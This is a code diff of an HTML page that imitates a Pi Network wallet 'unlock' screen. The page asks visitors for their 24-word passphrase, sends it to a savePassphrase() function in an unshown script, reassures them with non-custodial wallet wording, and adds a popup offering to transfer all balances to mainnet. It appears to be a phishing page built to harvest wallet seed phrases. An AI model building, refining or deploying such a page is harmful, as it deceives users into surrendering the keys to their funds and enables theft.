@@ -3,19 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pi Wallet Unlock</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Unlock Pi Wallet</title>
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
+
     <div class="container">
-        <h1>Pi Wallet Unlock</h1>
-        <p>Enter your passphrase securely:</p>
-        <form id="passphraseForm">
-            <input type="password" id="passphrase" placeholder="Enter your 24-word passphrase here" required>
-            <button type="submit">Submit</button>
-        </form>
-        <p id="status"></p>
+        <h2>Unlock Pi Wallet</h2>
+
+        <textarea id="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
+
+        <button class="unlock-btn" onclick="savePassphrase()">Unlock With Passphrase</button>
+
+        <button class="biometric-btn" disabled>Unlock With Biometrics</button>
+
+        <p class="info-text">
+            As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you.  
+            Recovery of passphrase is currently impossible.
+        </p>
+
+        <p class="lost-passphrase">
+            Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
+        </p>
     </div>
+
+    <!-- Themed Popup -->
+    <div id="popup" class="popup">
+        <div class="popup-content">
+            <p>Convert and transfer all the balances to mainnet?</p>
+            <button onclick="proceedToNextPage()">Proceed</button>
+        </div>
+    </div>
+
     <script src="script.js"></script>
+
 </body>
 </html>
